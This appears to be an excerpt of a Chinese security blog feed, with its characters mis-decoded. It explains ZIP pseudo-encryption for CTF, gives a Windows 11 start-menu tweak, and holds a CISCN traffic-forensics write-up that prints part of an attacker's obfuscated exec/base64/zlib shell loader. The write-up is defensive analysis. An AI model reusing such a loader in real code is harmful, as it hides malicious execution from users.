        <content type="html"><![CDATA[<h1 id="æ·±å…¥ç†è§£zipä¼ªåŠ å¯†"><a href="#æ·±å…¥ç†è§£zipä¼ªåŠ å¯†" class="headerlink" title="æ·±å…¥ç†è§£zipä¼ªåŠ å¯†"></a>æ·±å…¥ç†è§£zipä¼ªåŠ å¯†</h1><blockquote><p>å‰è¨€: ä¹‹å‰ä¸€ç›´è®¤ä¸º,zipçš„ä¼ªåŠ å¯†ä¹Ÿå°±æ˜¯åˆ¤æ–­å¥‡å¶ï¼Œæ”¹ä¸€æ”¹åŠ å¯†æ ‡å¿—ä½é‚£ä¹ˆç®€å•,ç”šè‡³å¯ä»¥ç›´æ¥ä¸Šæ‰‹æ‹¿å·¥å…·å»æ¢­,æ„Ÿè°¢ç»è¿‡C3ngHå¸ˆå‚…æŒ‡æ­£å,æ‰æ„è¯†åˆ°å…¶ä¸­åŸç†çš„é‡è¦æ€§. å¯¹å…¶æ·±å…¥ç ”ç©¶å, è®°å½•ä¸‹è¿™ç¯‡æ–‡ç« ã€‚</p></blockquote><h2 id="zipä¼ªåŠ å¯†åŸç†"><a href="#zipä¼ªåŠ å¯†åŸç†" class="headerlink" title="zipä¼ªåŠ å¯†åŸç†"></a>zipä¼ªåŠ å¯†åŸç†</h2><p>äº†è§£ä¼ªåŠ å¯†ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ·±å…¥ç†è§£zipçš„æ–‡ä»¶ç»“æ„ã€‚</p><p>ä¸€ä¸ªzipé€šå¸¸ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå³ï¼š <code>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</code>  <code>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</code>  <code>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</code></p><p>å¦‚å›¾ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510311651394.png" alt="image-20251031165119300"></p><h3 id="å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š"><a href="#å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š" class="headerlink" title="å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š"></a>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š</h3><div class="table-container"><table><thead><tr><th style="text-align:center">HEX</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">50 4B 03 04</td><td style="text-align:center">è¿™æ˜¯zipçš„å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰ï¼Œå¯¹åº”æ–‡æœ¬PK</td></tr><tr><td style="text-align:center">14 00</td><td style="text-align:center">è§£å‹æ–‡ä»¶æ‰€éœ€çš„ pkware ç‰ˆæœ¬</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰</td></tr><tr><td style="text-align:center">08 00</td><td style="text-align:center">å‹ç¼©æ–¹å¼ ï¼ˆ0x0008ï¼Œå¯¹åº”Deflatedï¼‰</td></tr><tr><td style="text-align:center">AA 84</td><td style="text-align:center">æœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ ï¼ˆéµå¾ªMS-DOSæ—¶é—´æ ¼å¼ï¼‰</td></tr><tr><td style="text-align:center">5F 5B</td><td style="text-align:center">æœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ ï¼ˆéµå¾ªMS-DOSæ—¶é—´æ ¼å¼ï¼‰</td></tr><tr><td style="text-align:center">6A B1 EC C9</td><td style="text-align:center">CRC-32æ ¡éªŒå’Œï¼ˆ0xC9ECB16Aï¼‰</td></tr><tr><td style="text-align:center">19 00 00 00</td><td style="text-align:center">å‹ç¼©åå°ºå¯¸</td></tr><tr><td style="text-align:center">18 00 00 00</td><td style="text-align:center">æœªå‹ç¼©å°ºå¯¸</td></tr><tr><td style="text-align:center">08 00</td><td style="text-align:center">æ–‡ä»¶åé•¿åº¦</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">æ‰©å±•è®°å½•é•¿åº¦</td></tr><tr><td style="text-align:center">66 6C 61 67 2E 74 78 74</td><td style="text-align:center">æ–‡ä»¶åï¼ˆå¯¹åº”flag.txtï¼‰</td></tr></tbody></table></div><h3 id="å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº"><a href="#å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº" class="headerlink" title="å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº"></a>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</h3><div class="table-container"><table><thead><tr><th style="text-align:center">HEX</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">50 4B 01 02</td><td style="text-align:center">ç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°</td></tr><tr><td style="text-align:center">1F 00</td><td style="text-align:center">å‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬</td></tr><tr><td style="text-align:center">14 00</td><td style="text-align:center">è§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰</td></tr><tr><td style="text-align:center">08 00</td><td style="text-align:center">å‹ç¼©æ–¹å¼</td></tr><tr><td style="text-align:center">AA 84</td><td style="text-align:center">æœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´</td></tr><tr><td style="text-align:center">5F 5B</td><td style="text-align:center">æœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ</td></tr><tr><td style="text-align:center">6A B1 EC C9</td><td style="text-align:center">CRC-32æ ¡éªŒå’Œ</td></tr><tr><td style="text-align:center">16 00 00 00</td><td style="text-align:center">å‹ç¼©åå°ºå¯¸</td></tr><tr><td style="text-align:center">18 00 00 00</td><td style="text-align:center">æœªå‹ç¼©å°ºå¯¸</td></tr><tr><td style="text-align:center">08 00</td><td style="text-align:center">æ–‡ä»¶åé•¿åº¦</td></tr><tr><td style="text-align:center">24 00</td><td style="text-align:center">æ‰©å±•å­—æ®µé•¿åº¦</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">æ–‡ä»¶æ³¨é‡Šé•¿åº¦ï¼ˆ0 å­—èŠ‚ï¼Œè¡¨ç¤ºæ²¡æœ‰æ³¨é‡Šï¼‰</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">ç£ç›˜å¼€å§‹å·ï¼ˆ0ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸è·¨ç£ç›˜ï¼‰</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">å†…éƒ¨æ–‡ä»¶å±æ€§</td></tr><tr><td style="text-align:center">20 00 00 00</td><td style="text-align:center">å¤–éƒ¨æ–‡ä»¶å±æ€§</td></tr><tr><td style="text-align:center">00 00 00 00</td><td style="text-align:center">å±€éƒ¨å¤´éƒ¨åç§»é‡</td></tr><tr><td style="text-align:center">66 6C 61 67 2E 74 78 74</td><td style="text-align:center">æ–‡ä»¶åï¼ˆå¯¹åº”flag.txtï¼‰</td></tr><tr><td style="text-align:center">0A 00 20 00 â€¦ DC 01</td><td style="text-align:center">æ‰©å±•å­—æ®µï¼ˆé•¿åº¦ä¸º36å­—èŠ‚ï¼Œè¿™æ˜¯ç”±ä¸Šé¢çš„æ‰©å±•å­—æ®µé•¿åº¦24 00å†³å®šçš„ã€‚è¿™æ˜¯ZIP64ã€NTFSæ—¶é—´æˆ³ç­‰æ‰©å±•ä¿¡æ¯çš„å­˜æ”¾ä½ç½®ï¼‰</td></tr></tbody></table></div><h3 id="å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—"><a href="#å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—" class="headerlink" title="å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—"></a>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</h3><div class="table-container"><table><thead><tr><th style="text-align:center">HEX</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">50 4B 05 06</td><td style="text-align:center">ç›®å½•ç»“æŸæ ‡è®°</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">å½“å‰ç£ç›˜ç¼–å·ï¼ˆå› ä¸ºè¯¥ZIPæ–‡ä»¶æ²¡æœ‰åˆ†å·ï¼Œä¸è·¨è¶Šå¤šå¼ ç£ç›˜ï¼Œæ‰€ä»¥ä»0å¼€å§‹ï¼‰</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">ç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å· ï¼ˆåŒä¸Šï¼Œè¡¨ç¤ºä¸­å¤®ç›®å½•ä¹Ÿä½äºç¬¬ä¸€ä¸ªç£ç›˜ä¸Šï¼‰</td></tr><tr><td style="text-align:center">01 00</td><td style="text-align:center">æœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•° ï¼ˆè¡¨ç¤ºå½“å‰ç£ç›˜ä¸Šæœ‰1æ¡ä¸­å¤®ç›®å½•è®°å½•ï¼‰</td></tr><tr><td style="text-align:center">01 00</td><td style="text-align:center">ç›®å½•åŒºä¸­çºªå½•æ€»æ•° ï¼ˆè¿™æ˜¯æ•´ä¸ªZIPæ–‡ä»¶ä¸­æœ€é‡è¦çš„è®¡æ•°ä¹‹ä¸€ï¼Œå®ƒè¡¨æ˜è¿™ä¸ªZIPæ–‡ä»¶ä¸­æ€»å…±åŒ…å«1ä¸ªæ–‡ä»¶ï¼‰</td></tr><tr><td style="text-align:center">5A 00 00 00</td><td style="text-align:center">ç›®å½•åŒºå°ºå¯¸å¤§å° ï¼ˆåè¿›åˆ¶90å­—èŠ‚ã€‚è¿™æŒ‡çš„æ˜¯ä»50 4B 01 02å¼€å§‹åˆ°ä¸­å¤®ç›®å½•è®°å½•ç»“æŸçš„æ‰€æœ‰å­—èŠ‚é•¿åº¦ï¼‰</td></tr><tr><td style="text-align:center">3C 00 00 00</td><td style="text-align:center">ç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡ ï¼ˆä¸­å¤®ç›®å½•ç›¸å¯¹äºå­˜æ¡£èµ·å§‹ä½ç½®çš„åç§»é‡ã€‚å°ç«¯åºï¼Œ0x0000003C = åè¿›åˆ¶ 60 å­—èŠ‚ã€‚è¿™æ„å‘³ç€ï¼Œè§£å‹è½¯ä»¶éœ€è¦ä»ZIPæ–‡ä»¶å¼€å¤´è·³è¿‡60ä¸ªå­—èŠ‚ï¼Œå°±èƒ½æ‰¾åˆ°ä¸­å¤®ç›®å½•ï¼ˆå³ PK\x01\x02 ç­¾åï¼‰</td></tr><tr><td style="text-align:center">00 00</td><td style="text-align:center">ZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦ï¼ˆ0è¡¨ç¤ºZIPæ–‡ä»¶æ²¡æœ‰å…¨å±€æ³¨é‡Šï¼‰</td></tr><tr><td style="text-align:center">æ— </td><td style="text-align:center">ZIPæ–‡ä»¶æ³¨é‡Šå†…å®¹ï¼ˆå› ä¸ºæ³¨é‡Šé•¿åº¦ä¸º0ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰æ•°æ®ï¼‰</td></tr></tbody></table></div><h3 id="ä¼ªåŠ å¯†åŸç†"><a href="#ä¼ªåŠ å¯†åŸç†" class="headerlink" title="ä¼ªåŠ å¯†åŸç†"></a>ä¼ªåŠ å¯†åŸç†</h3><p>åœ¨ä¸€ä¸ª<strong>æ­£å¸¸ã€å¥åº·çš„ZIPæ–‡ä»¶</strong>ä¸­ï¼Œå¯¹äºåŒä¸€ä¸ªæ–‡ä»¶æ¡ç›®ï¼Œå…¶å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºå’Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºä¸­çš„â€œå…¨å±€æ–¹å¼ä½æ ‡è®°â€ï¼ˆå³åŠ å¯†æ ‡å¿—ï¼‰<strong>å¿…é¡»å®Œå…¨ä¸€è‡´</strong>ã€‚</p><p>å¦‚ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510311730437.png" alt="image-20251031173026383"></p><p>è€Œè§£å‹è½¯ä»¶å¤„ç†ZIPæ–‡ä»¶é€šå¸¸åˆ†ä¸¤æ­¥ï¼š</p><p>æ­¥éª¤ä¸€ï¼šåˆ—å‡ºæ–‡ä»¶åˆ—è¡¨</p><p>è½¯ä»¶é¦–å…ˆè¯»å–ZIPæ–‡ä»¶æœ«å°¾çš„<strong>ä¸­å¤®ç›®å½•ï¼ˆç›®å½•åŒºï¼‰</strong>ï¼Œè¿™é‡ŒåŒ…å«äº†æ‰€æœ‰æ–‡ä»¶çš„ç´¢å¼•ä¿¡æ¯ï¼ˆæ–‡ä»¶åã€åŠ å¯†æ ‡å¿—ç­‰ï¼‰ï¼Œè½¯ä»¶æ ¹æ®è¿™é‡Œçš„ä¿¡æ¯å‘ç”¨æˆ·å±•ç¤ºæ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶ç»™åŠ å¯†æ–‡ä»¶æ‰“ä¸Šâ€œ*â€çš„å›¾æ ‡ã€‚</p><p>æ­¥éª¤äºŒï¼šè§£å‹å…·ä½“æ–‡ä»¶</p><p>å½“ç”¨æˆ·é€‰æ‹©è§£å‹ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè½¯ä»¶æ ¹æ®ä¸­å¤®ç›®å½•è®°å½•çš„æŒ‡é’ˆï¼Œæ‰¾åˆ°æ–‡ä»¶å¯¹åº”çš„<strong>æœ¬åœ°æ–‡ä»¶å¤´ï¼ˆæ•°æ®åŒºï¼‰</strong>ï¼Œè½¯ä»¶ä¾æ®<strong>æ•°æ®åŒº</strong>ä¸­çš„æ ‡å¿—ä½æ¥æ‰§è¡Œå®é™…çš„è§£å‹æ“ä½œã€‚</p><p>ä¼ªåŠ å¯†ï¼Œåˆ™æ˜¯åœ¨ä¸€ä¸ªæ­£å¸¸æœªåŠ å¯†çš„zipæ–‡ä»¶ä¸Šè¿›è¡Œä¿®æ”¹ï¼šå°†å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°æ”¹ä¸ºåŠ å¯†çš„çŠ¶æ€ï¼Œè¿™æ ·ï¼Œå‹ç¼©è½¯ä»¶é¦–å…ˆè¯»å–ç›®å½•åŒºï¼Œå°±ä¼šè®¤ä¸ºâ€œè¿™æ˜¯ä¸€ä¸ªåŠ å¯†æ–‡ä»¶â€ï¼Œä»è€Œå‘ç”¨æˆ·ç´¢è¦å¯†ç ã€‚ï¼ˆä½†å®é™…ä¸Šï¼Œæ–‡ä»¶æ ¹æœ¬æ²¡æœ‰åŠ å¯†ï¼Œè¿™ä¹Ÿæ˜¯â€œä¼ªåŠ å¯†â€å«æ³•çš„ç”±æ¥ã€‚ï¼‰</p><p>ä¾‹å¦‚ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510311745846.png" alt="image-20251031174523805"></p><p>è¿™é‡Œå°†00 00æ”¹ä¸º09 00ï¼Œå‹ç¼©è½¯ä»¶å°±ä¼šæ˜¾ç¤ºåŠ å¯†ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510311746413.png" alt="image-20251031174631352"></p><blockquote><p>ç»è¿‡å®æµ‹ï¼Œ7-Zipæ£€æµ‹çš„æ˜¯æ•°æ®åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼Œå…¶ä»–è§£å‹è½¯ä»¶ï¼Œä¾‹å¦‚BandZipå’ŒWinRARæ£€æµ‹ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼Œè¿™ä¸‰ç§è½¯ä»¶éƒ½åªæ£€æµ‹ä¸€ä½ï¼Œå¹¶ä¸ä¼šæ£€æµ‹å¦ä¸€ä¸ªä½ç½®ï¼ŒåŒæ—¶ä¹Ÿä¸ä¼šè¿›è¡ŒæŠ¥é”™ã€‚</p></blockquote><p>ä½ å¯èƒ½ä¼šå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œéå¾—æ”¹æˆ09è€Œä¸æ˜¯å…¶å®ƒæ•°å­—å‘¢ï¼Ÿ</p><p>è¿™ä¸å‹ç¼©è½¯ä»¶åˆ¤æ–­é€šè¿‡å…¨å±€æ–¹å¼ä½æ ‡è®°åˆ¤å®šåŠ å¯†çš„é€»è¾‘æœ‰å…³ï¼š</p><p>å…¨å±€æ–¹å¼ä½æ ‡è®°æ˜¯ä¸€ä¸ª<strong>16ä½çš„äºŒè¿›åˆ¶æ•°</strong>ï¼ˆåœ¨ZIPæ–‡ä»¶ä¸­ä»¥2ä¸ªå­—èŠ‚è¡¨ç¤ºï¼‰ï¼Œåœ¨è¿™16ä¸ªä½ä¸­ï¼Œ<strong>æœ€ä½ä½</strong>ï¼ˆLeast Significant Bit, ä¹Ÿç§°ä¹‹ä¸ºç¬¬0ä½ï¼‰æ˜¯<strong>åŠ å¯†çš„æ€»å¼€å…³</strong>ã€‚</p><p>åœ¨ZIPæ–‡ä»¶ä¸­ï¼Œè¿™2ä¸ªå­—èŠ‚æ˜¯<strong>å°ç«¯åº</strong>å­˜å‚¨çš„ã€‚ä¾‹å¦‚ï¼Œä½ çœ‹åˆ° <code>00 00</code>ï¼Œå®é™…å€¼åº”ä¸º <code>0x0000</code>ã€‚</p><p>å¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸ºï¼š<code>0000 0000 0000 0000</code>ï¼Œæœ€ä½ä½ä¸º<code>0</code>ï¼Œå› æ­¤åˆ¤å®šä¸ºæœªåŠ å¯†ï¼Œå‹ç¼©è½¯ä»¶ä¼šç›´æ¥è§£å‹ã€‚</p><p>è€Œ<code>09 00</code>ï¼Œå¯¹åº”äºŒè¿›åˆ¶æ•°ï¼š<code>0000 0000 0000 1001</code>ï¼Œæœ€ä½ä½ä¸º<code>1</code>ï¼Œå› æ­¤ä¼šåˆ¤å®šä¸ºåŠ å¯†ã€‚</p><p>ä¸åŒçš„åŠ å¯†ç®—æ³•ä¹Ÿå…·æœ‰ä¸åŒçš„è¯¦ç»†ç‰¹å¾ï¼š</p><div class="table-container"><table><thead><tr><th style="text-align:left">åŠ å¯†ç®—æ³•</th><th style="text-align:left">å…¨å±€æ–¹å¼ä½æ ‡è®° (äºŒè¿›åˆ¶)</th><th style="text-align:left">å…¸å‹åå…­è¿›åˆ¶å€¼</th><th style="text-align:left">åŸç†ä¸ç‰¹ç‚¹</th></tr></thead><tbody><tr><td style="text-align:left">æœªåŠ å¯†</td><td style="text-align:left">xxxx xxxx xxxx xxx0</td><td style="text-align:left"><code>00 00</code>, <code>08 00</code></td><td style="text-align:left">ç¬¬0ä½ = 0ã€‚æ€»å¼€å…³å…³é—­ï¼Œæ–‡ä»¶æœªåŠ å¯†ã€‚</td></tr><tr><td style="text-align:left">PKWARE ä¼ ç»ŸåŠ å¯†</td><td style="text-align:left">xxxx xxxx xxxx xxx1</td><td style="text-align:left"><code>01 00</code>, <code>09 00</code></td><td style="text-align:left">ç¬¬0ä½ = 1ï¼Œä¸”ç¬¬6ä½å’Œç¬¬11ä½å‡ä¸º0ã€‚è¿™æ˜¯ZIPæ ¼å¼æœ€åˆå®šä¹‰çš„å¼±åŠ å¯†ç®—æ³•ã€‚</td></tr><tr><td style="text-align:left">AES åŠ å¯†</td><td style="text-align:left">xxxx xxx1 xxxx 1xx1</td><td style="text-align:left"><code>01 09</code>, <code>01 41</code>, <code>01 63</code></td><td style="text-align:left">ç¬¬0ä½=1ï¼ˆåŠ å¯†ï¼‰ï¼Œä¸”ç¬¬6ä½=1ï¼Œç¬¬11ä½=1ã€‚è¿™æ˜¯WinZipå¼€å‘å¹¶æ ‡å‡†åŒ–çš„å¼ºåŠ å¯†ã€‚</td></tr></tbody></table></div><p>ä½†æ˜¯æ€»çš„æ¥è¯´ï¼Œä¸ç®¡å“ªç§åŠ å¯†ï¼Œç¬¬0ä½éƒ½æ˜¯å†³å®šåŠ å¯†çš„æ€»å¼€å…³ï¼Œå½“ç¬¬0ä½ä¸º0æ—¶ï¼Œå¯¹åº”çš„åå…­è¿›åˆ¶å€¼ä¸ºå¶æ•°å€¼ï¼Œå½“ç¬¬0ä¸ºä¸º1æ—¶ï¼Œå¯¹åº”çš„åå…­è¿›åˆ¶å€¼ä¸ºå¥‡æ•°å€¼ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬æ‰æœ‰äº†é€šè¿‡åˆ¤å®šå¥‡å¶å€¼æ¥åˆ¤æ–­åŠ å¯†çš„è¯´æ³•ã€‚</p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>åœ¨CTF æ¯”èµ›é¢˜ç›®ä¸­ï¼Œæ¶‰åŠåˆ°ä¼ªåŠ å¯†ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦åŒæ—¶åˆ†æzipçš„å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºå’Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼Œåˆ¤å®šå…¶æ˜¯å¦ä¸ºä¼ªåŠ å¯†ï¼Œå†é€šè¿‡ä¿®æ”¹ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°æ¥ç ´è§£ä¼ªåŠ å¯†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win11è¿˜åŸwin10çš„ç£è´´åŠŸèƒ½</title>
      <link href="/2025/10/28/win11%E8%BF%98%E5%8E%9Fwin10%E7%A3%81%E8%B4%B4/"/>
      <url>/2025/10/28/win11%E8%BF%98%E5%8E%9Fwin10%E7%A3%81%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="windows11è¿˜åŸç£è´´åŠŸèƒ½"><a href="#windows11è¿˜åŸç£è´´åŠŸèƒ½" class="headerlink" title="windows11è¿˜åŸç£è´´åŠŸèƒ½"></a>windows11è¿˜åŸç£è´´åŠŸèƒ½</h1><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510281319119.png" alt="image-20251028131929608"></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>è‹¥è¦åœ¨Windows11ä¸Šä½¿ç”¨ç£è´´å¼€å§‹èœå•ï¼Œéœ€è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·:</p><p><a href="https://github.com/valinet/ExplorerPatcher">https://github.com/valinet/ExplorerPatcher</a></p><p>è¿è¡Œå,ä»»åŠ¡æ å³é”®ä¼šå¤šå‡ºå±æ€§</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510281701939.png" alt="image-20251028170153895"></p><p>ç‚¹å‡»è¿›è¡Œé…ç½®</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510281702167.png" alt="image-20251028170234130"></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¯”èµ›å¤ç°æ–‡æ¡£</title>
      <link href="/2025/10/28/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E6%96%87%E6%A1%A3/"/>
      <url>/2025/10/28/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¯”èµ›å¤ç°æ–‡æ¡£"><a href="#æ¯”èµ›å¤ç°æ–‡æ¡£" class="headerlink" title="æ¯”èµ›å¤ç°æ–‡æ¡£"></a>æ¯”èµ›å¤ç°æ–‡æ¡£</h1><blockquote><p> è·¯è™½è¿œï¼Œè¡Œåˆ™å°†è‡³ï¼›äº‹è™½éš¾ï¼Œåšåˆ™å¿…æˆ</p></blockquote><p>å—¯ï¼Œå¦‚ä½ æ‰€è§ï¼Œè¿™æ˜¯ä¸€ä¸ªæ–‡æ¡£ã€‚<br>è¿™é‡Œæ”¶å½•äº†ä¸€äº›æˆ‘é‡åˆ°çš„é¢˜ç›®ï¼ŒåŒ…å«æ¯”èµ›æœªåšå‡ºçš„é¢˜ç›®ï¼Œä»¥åŠä¸€äº›ä¸ªäººè®¤ä¸ºæœ‰ä»·å€¼å¹¶ä»ä¸­å­¦åˆ°çŸ¥è¯†çš„é¢˜ç›®ã€‚<br>å¥½é¢˜å…±èµingâ€¦å˜»å˜»~</p><h2 id="2025-CISCN-amp-CCB-åˆèµ›"><a href="#2025-CISCN-amp-CCB-åˆèµ›" class="headerlink" title="2025 CISCN&amp;CCB åˆèµ›"></a>2025 CISCN&amp;CCB åˆèµ›</h2><p>MISCä»…æœ‰ä¸€å¥—æµé‡é¢˜å’Œä¸¤é“AIï¼ŒAIçœŸæ— ä»ä¸‹æ‰‹äº†ï¼Œå†™å†™æµé‡é¢˜ï¼š</p><h4 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h4><p><strong>æ”»å‡»è€…çˆ†ç ´æˆåŠŸçš„åå°å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxxxxxx}</strong></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210438394.png" alt="image-20251229210438394"></p><p>è¿‡æ»¤httpåè®®ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤š/admin/loginçš„è¯·æ±‚ï¼Œ</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210535314.png" alt="image-20251229210535314"></p><p>å‘ç°å¯†ç çˆ†ç ´ï¼Œç›´æ¥æ‰¾æ—¶é—´ä¸Šæœ€åä¸€æ¡/admin/loginï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210602913.png" alt=""></p><p>å¾—åˆ°å¯†ç </p><h4 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h4><p><strong>æ”»å‡»è€…é€šè¿‡æ¼æ´åˆ©ç”¨è·å–Flaskåº”ç”¨çš„ SECRET_KEY æ˜¯ä»€ä¹ˆï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxxxxxxx}</strong></p><p>ç›´æ¥åœ¨æµé‡åŒ…å…¨å±€è¿‡æ»¤<strong>secret_key</strong>,åªæœ‰ä¸€ä¸ªæ•°æ®åŒ…ï¼ŒæŸ¥çœ‹å¾—åˆ°ï¼š</p><p>(è¿™é‡Œå…¶å®æ˜¯ç™»å½•æˆåŠŸåï¼Œåç»­æ”»å‡»è€…æ‰§è¡Œäº†æ¨¡æ¿æ³¨å…¥å‘½ä»¤çš„ç»“æœï¼Œä»ç™»å½•æˆåŠŸçš„æ•°æ®åŒ…å‘ä¸‹è¿½è¸ªï¼Œå³å¯ä»¥çœ‹åˆ°æ”»å‡»è€…æ³¨å…¥å‘½ä»¤çš„å…¨è¿‡ç¨‹)</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210717312.png" alt=""></p><h4 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h4><p><strong>æ”»å‡»è€…æ¤å…¥çš„æœ¨é©¬ä½¿ç”¨äº†åŠ å¯†ç®—æ³•æ¥éšè—é€šè®¯å†…å®¹ã€‚è¯·åˆ†ææ³¨å…¥Payloadï¼Œç»™å‡ºè¯¥åŠ å¯†ç®—æ³•ä½¿ç”¨çš„å¯†é’¥å­—ç¬¦ä¸²(Key) ï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxxxxx}</strong></p><p>åˆ†ææ”»å‡»è€…ç™»å½•åçš„æ“ä½œï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229210803286.png" alt="image-20251229210803286"></p><p>è¿™é‡Œæ˜¯é€šè¿‡å‘½ä»¤æ³¨å…¥ä¼ äº†ä¸€ä¸ªshellæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨äº†ç¼–ç </p><p>å†…å®¹è§£ç å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ = <span class="keyword">lambda</span> __ : <span class="built_in">__import__</span>(<span class="string">&#x27;zlib&#x27;</span>).decompress(<span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64decode(__[::-<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">exec</span>((_)(<span 